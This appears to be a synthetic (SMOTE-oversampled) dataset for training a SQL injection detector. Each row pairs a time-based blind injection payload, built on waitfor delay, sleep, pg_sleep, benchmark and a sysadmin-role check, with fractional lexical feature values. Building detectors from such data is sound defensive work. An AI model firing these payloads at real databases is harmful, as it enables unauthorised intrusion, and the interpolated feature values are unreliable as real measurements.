id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001516,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.5442488991508294,59.38083760978995,25.535287946177924,4.17377799838319,29.310261717434102,3.267643973088962,13.80293191926689,13.0,0.47791892984604845,0.054080741350894614,0.23418530752335986,0.23381502127969706,3.2676439730889624,0.0,2.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,2.098534040366556,1.0,2.633821986544481,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001517,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.767963806362457,56.062137881849885,25.407101472211416,4.25711278042254,28.637282729109927,3.203550736105707,11.619529048581391,12.601775368052854,0.5001268120037753,0.05714285714285714,0.19443788869024464,0.24829244216312296,3.203550736105708,0.0,2.0,0.0,0.0,0.0,0.0,1.6017753680528535,0.0,2.1946738958414382,1.0,2.601775368052854,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001518,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl,nearest_attack_euclidean,R000104,1.2550190729635915,127.89302938070458,24.432558820078285,2.952458708144362,38.567441179921715,2.0,68.46047056062628,18.865117640156573,0.30205763767055627,0.01565692100646318,0.5348685083538602,0.14741693296912034,4.0,0.0,0.0,0.0,1.0,1.0,0.0,12.865117640156573,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.567441179921714,0.43255882007828583,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001519,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,0.40720863834088766,66.75869934711729,21.43354248406702,3.3196995585456346,20.458071894916227,10.867084968134035,28.21677124203351,7.216771242033509,0.3074512367735592,0.16181830934530378,0.42280268166353835,0.10792777221759872,1.0,0.0,0.0,0.0,0.0,1.1083856210167546,0.0,4.0,0.0,0.0,0.10838562101675459,1.1083856210167546,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.10838562101675453,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1083856210167546
SMOTE_001520,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.6995608664378217,58.31282130576634,25.387975352519497,4.167139095742276,28.53687060072735,3.1939876762597477,13.581963028779242,13.0,0.4728245831838188,0.05377277077181777,0.23474992025166744,0.238652725792696,3.1939876762597477,0.0,2.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,2.2090184856103785,1.0,2.596993838129874,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001521,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,3.692618618341518,39.05379955384427,23.486550111538932,4.178366956214414,16.0,2.0,8.053799553844275,13.0,0.4107707364129806,0.051346342051622584,0.20413169819985005,0.33375122333554674,2.0,0.48655011153893124,2.0,0.0,0.0,0.0,0.4865501115389313,1.5134498884610683,0.0,4.0,0.5134498884610688,2.0,1.0,0.48655011153893124,1.0,0.0,0.0,0.0,1.0,0.4865501115389313,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001522,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000154,1.0655471288989997,46.427998338877075,21.21399916943854,4.12031892740988,27.0,3.78600083056146,7.641997508315615,8.0,0.5817228463996009,0.08172284639960092,0.16419198234165713,0.17236232485914102,2.0,3.78600083056146,0.0,0.0,0.0,0.0,0.0,0.21399916943853903,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.2139991694385398,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001523,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,0.6950240438520183,85.9797709006204,20.326590300206796,2.9786462876471576,27.435453733609062,2.0,43.21772686680453,13.326590300206798,0.3189686799799774,0.023284162477942336,0.5029257365396381,0.15482142100244214,1.3265903002067974,0.0,0.0,0.0,1.0,0.10886343340226579,0.0,8.891136566597734,1.1088634334022656,0.0,0.0,1.1088634334022658,1.0,0.0,0.0,0.8911365665977342,0.0,0.10886343340226579,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.21772686680453152,0.8911365665977342,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.108863433402266
SMOTE_001524,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.39165131183981217,43.065605017817774,17.0,3.143341354328825,13.0,0.0,18.388004181514816,11.677600836302963,0.30582298637600597,-1.3877787807814457e-17,0.4216485439810176,0.2725284696429764,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.6776008363029633,0.0,5.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001525,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000088,0.95482554531928,25.59426004127964,11.89856501031991,2.7968759834054118,8.16427501719985,2.0,11.79713002063982,3.6328550034399694,0.3129363890799983,0.08298422206933467,0.4585078889653327,0.14557149988533433,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.63285500343997,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6328550034399697,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001526,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,0.4964711414496282,97.09277803753504,29.278334112605116,3.7168710610367115,25.463890187675194,18.0,39.0,14.628887849859845,0.262221533480551,0.18539133129858715,0.4016812178136055,0.15070591740725642,3.721665887394884,0.0,0.18555607507007738,0.0,0.0,2.0,0.0,5.907221962464962,0.0,0.09277803753503866,0.9072219624649613,4.0,1.0,0.0,0.09277803753503869,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,0.09277803753503869,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9072219624649613,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001527,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,nearest_attack_euclidean,R000097,1.9159123352139842,116.48641381825429,24.410229064937653,3.0861244532055028,39.179541870124694,1.4102290649376537,59.43526849356602,16.46137438962592,0.34188294619641396,0.01178572416757602,0.5060066237673984,0.14032470586861162,3.410229064937653,0.0,0.0,0.0,1.0,0.41022906493765315,0.0,11.640916259750613,0.0,0.0,0.0,1.4102290649376532,1.0,0.0,0.0,0.0,0.0,0.4102290649376532,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.0,0.4102290649376532,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.410229064937653
SMOTE_001528,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",nearest_attack_euclidean,R000147,0.08085984485308734,81.75864112780296,23.91954704260099,3.3304891141570496,21.026817652466338,10.0,37.7854587802693,12.946364695067325,0.2573116578380183,0.12235442511225698,0.46200789460834785,0.15832602244137692,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.9463646950673255,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0268176524663373,0.9731823475336627,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001529,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.4174765879949063,38.738383430499596,24.0,4.235089152560403,16.0,2.0,7.490042940428221,13.24834049007137,0.415347582992633,0.05191844787407913,0.18961995590469696,0.3431140132285909,2.0,1.0,2.0,0.0,0.0,0.0,1.0000000000000002,1.24834049007137,0.0,4.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0000000000000002,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001530,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,1.9127315638687485,70.51591495507503,18.683863831835836,2.8027258557055035,18.470910654686676,2.0,37.67727663671669,12.367727663671669,0.2617096595795896,0.029742042522462472,0.5278704682285085,0.18067782966943952,0.0,4.0,0.0,0.0,0.0,1.0,0.0,6.735455327343338,0.632272336328331,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001531,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000124,0.41016673093387596,56.39441703459597,21.87323481503673,3.4834184006810234,18.38029555488981,10.0,22.760591109779618,5.25353036992654,0.3261203165003339,0.1779768125768706,0.403073095393049,0.09282977552974651,0.12676518496326983,0.0,0.0,0.0,0.0,1.0,0.0,3.1267651849632694,0.0,0.0,0.0,1.0,0.12676518496326966,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.8732348150367303,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.87323481503673
SMOTE_001532,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.2723021372917722,39.9271621041885,16.518209473952876,3.2056162321198753,13.0,0.0,15.927162104188504,11.0,0.3264078274721488,-1.3877787807814457e-17,0.3974009338975715,0.2761912386302797,0.0,0.5182094739528741,2.0,0.0,0.0,0.0,0.0,3.481790526047126,0.0,5.0,0.0,2.0,0.0,0.5182094739528741,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001533,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",nearest_attack_euclidean,R000147,1.2215258252429353,92.42921876397463,23.565449218167725,3.1353848447604946,21.0,10.0,46.691015636645524,14.738203127329104,0.23090041485924218,0.10995257850440103,0.49981051186998354,0.15933649476637327,4.0,0.0,0.0,0.0,0.0,2.0,0.0,7.738203127329104,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001534,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.935662592287909,33.030969624584436,15.257742406146107,3.3009501706851525,12.257742406146107,0.0,11.144356015365272,9.628871203073054,0.3728929776802205,-1.3877787807814457e-17,0.3331291780094763,0.2939778443103032,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.6288712030730537,0.0,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.6288712030730538,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6288712030730541
SMOTE_001535,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,1.3167964163650374,53.48567760457692,23.24570328137308,4.048399349977883,27.0,4.0,12.988542083661542,9.497135520915386,0.5084963915669344,0.07533279875065693,0.23877064930760575,0.1774001603748029,2.0,4.0,0.0,0.0,0.0,0.0,0.0,1.4971355209153852,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7485677604576927,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001536,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.8682981857148284,28.94055368605582,19.940553686055825,4.161178610926146,14.35244294884466,3.2356677883665057,2.4118892627888364,8.940553686055823,0.4936437623291455,0.11715210182040947,0.08546831237511449,0.3037358234753306,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,2.352442948844659,0.5881107372111648,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001537,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.1315459484577965,37.63751612275077,16.0,3.005429389629409,10.999999999999998,0.0,17.318758061375384,9.318758061375382,0.29243750703377797,-1.3877787807814457e-17,0.4601221581317576,0.24744033483446448,0.6812419386246176,0.6375161227507649,0.0,0.0,0.0,1.0,0.0,3.0,0.0,4.0,0.0,1.0,0.6812419386246176,0.31875806137538243,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001538,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000095,1.7654676333484072,69.4813322955864,20.60903692173182,3.336544889661442,22.781926156536358,6.481332295586398,29.60903692173182,10.609036921731821,0.33015652802317064,0.08953851340366932,0.42744429075745527,0.15286066781570476,3.609036921731822,0.0,0.0,0.0,0.0,1.6090369217318221,0.0,4.390963078268178,0.0,0.390963078268178,0.6090369217318221,1.6090369217318221,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.390963078268178,0.0,0.0,0.0,1.6090369217318217,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.609036921731822,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.609036921731822
SMOTE_001539,attack,time,1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000125,0.4346041736205088,81.6379356301913,19.781608582641162,2.9909330111062524,27.0,2.0,40.52873992151187,12.109195708679419,0.3316810181558994,0.0245689643078444,0.4951868031767749,0.14856321435948133,0.890804291320581,0.0,0.0,0.0,1.0,0.0,0.0,8.327587126038257,0.8908042913205809,0.0,0.0,1.0,0.8908042913205808,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001540,attack,time,"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",nearest_attack_euclidean,R000143,0.06763997435387475,46.501815009301524,20.07720230912331,3.5342580420237786,21.12867051520552,2.102936412164417,16.218739875849387,7.051468206082209,0.4553403397708751,0.044432594614056284,0.3483460343069686,0.1518810313081,0.0,4.0,0.0,0.0,0.0,1.012867051520552,0.0,2.0257341030411036,0.0,0.012867051520552009,0.0,1.0128670515205518,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.01286705152055223,0.0,0.0,0.012867051520552064,1.012867051520552,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.987132948479448,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0257341030411045
SMOTE_001541,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",nearest_attack_euclidean,R000082,0.1052576490032396,85.31731298756638,26.070513997236976,3.6990023026753236,30.964743001381514,10.0,33.282055988947896,11.070513997236974,0.36309968116431424,0.11724992116700077,0.38992533547820785,0.1297250621904772,0.0,4.0,0.0,0.0,0.0,2.0,0.0,4.070513997236974,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,1.964743001381513,0.03525699861848702,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001542,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,0.9909499797610543,54.91577827640003,18.47894456910001,3.323285338474005,25.47894456910001,1.1736851436333309,21.43683370730002,6.82631485636667,0.4656879552640544,0.022216091583118838,0.3874606709391425,0.12463528221368417,2.4789445691000074,0.6947405745333232,0.0,0.0,0.0,0.0,0.0,3.6526297127333383,0.0,0.0,0.0,0.0,0.826314856366669,0.17368514363333076,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.8263148563666691,0.0,0.0,0.0,1.1736851436333309,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001543,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,0.7285879066368808,82.62398491071355,24.633604023809724,3.389681102971078,16.84159899404757,19.316802011904862,35.78238591666597,10.683197988095138,0.20452574302721233,0.23564242986695058,0.43055317248899044,0.1292786546168467,0.0,1.0,0.0,0.0,0.0,1.0,0.0,6.524796982142708,0.15840100595243062,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.15840100595243078,0.8415989940475693,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001544,attack,time,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf,nearest_attack_euclidean,R000133,0.9371583779452218,105.75849429686492,24.427969581799694,3.2558289075408924,31.953384030333844,8.283908745399078,50.90255513326554,14.618646387866463,0.3047871495915015,0.07632240828478762,0.4805722289381834,0.13831821318552756,3.809323193933231,0.0,0.0,0.0,0.19067680606676918,1.8093231939332308,0.0,8.0,0.0,0.8093231939332308,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.1906768060667692,0.0,0.0,1.0,1.8093231939332308,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.19067680606676918,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.190676806066769
SMOTE_001545,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,0.13504248897119508,103.81629969095495,29.03674006180901,3.583876232398456,30.03674006180901,18.0,44.779559629145936,11.0,0.2893679075077203,0.17339807746336547,0.43126852324574644,0.10596549178316779,0.0,0.03674006180900968,2.0,0.0,0.0,2.0,0.0,5.9632599381909905,0.0,1.0,0.0,4.0,0.0,0.036740061809009655,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.03674006180900974,0.9632599381909903,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
